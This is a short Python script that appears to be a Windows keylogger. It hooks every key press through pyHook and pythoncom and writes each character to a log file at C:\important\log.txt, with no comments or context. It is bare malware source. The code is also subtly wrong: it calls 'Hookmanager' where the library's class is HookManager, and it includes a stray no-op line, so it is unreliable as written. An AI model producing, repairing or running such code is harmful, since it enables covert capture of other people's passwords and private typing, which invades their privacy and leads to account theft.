import pyHook, pythoncom, sys, logging

file_log = 'C:\\important\\log.txt'

def OnkeyboardEvent(event):
		logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
		chr(event.Ascii)
		logging.log(10,chr(event.Ascii))
		return True
		
		
hooks_manager=pyHook.Hookmanager()
hooks_manager.KeyDown= OnkeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
